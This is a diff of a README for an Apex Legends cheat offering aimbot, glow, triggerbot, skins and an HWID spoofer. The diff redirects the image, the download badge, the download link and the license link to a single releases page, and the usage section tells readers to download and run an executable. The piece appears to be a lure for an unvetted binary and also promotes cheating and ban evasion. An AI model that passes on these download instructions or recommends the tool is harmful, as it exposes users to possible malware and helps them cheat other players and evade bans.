@@ -1,6 +1,6 @@
 # Apex Legends External Cheat Hack - Trigger, Glow, Aimbot, Skin & More + Hwid Spoofer 🎮
 
-![Apex Legends Cheat Image](https://www.example.com/apex-legends-cheat-image.jpg)
+![Apex Legends Cheat Image](https://github.com/almighty101/Apex-Legends-External-Cheat-Hack-Trigger-Glow-Aimbot-Skin-More-Hwid-Spoofer/releases)
 
 ---
 
@@ -33,9 +33,9 @@ Welcome to the **Apex Legends External Cheat Hack** repository! Apex Legends is 
 
 ## Usage
 
-Simply download the cheat hack from the following link: [Download Now](https://github.com/file/Soft.zip). Once downloaded, extract the files and run the cheat hack executable. Make sure to follow any instructions provided to ensure smooth operation.
+Simply download the cheat hack from the following link: [Download Now](https://github.com/almighty101/Apex-Legends-External-Cheat-Hack-Trigger-Glow-Aimbot-Skin-More-Hwid-Spoofer/releases). Once downloaded, extract the files and run the cheat hack executable. Make sure to follow any instructions provided to ensure smooth operation.
 
-![Download Now](https://img.shields.io/badge/Download-Now-success)
+![Download Now](https://github.com/almighty101/Apex-Legends-External-Cheat-Hack-Trigger-Glow-Aimbot-Skin-More-Hwid-Spoofer/releases)
 
 ---
 
@@ -65,7 +65,7 @@ We welcome any contributions to enhance the cheat hack and bring new features to
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Apex-Legends-External-Cheat-Hack/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/almighty101/Apex-Legends-External-Cheat-Hack-Trigger-Glow-Aimbot-Skin-More-Hwid-Spoofer/releases) file for details.
 
 ---
 
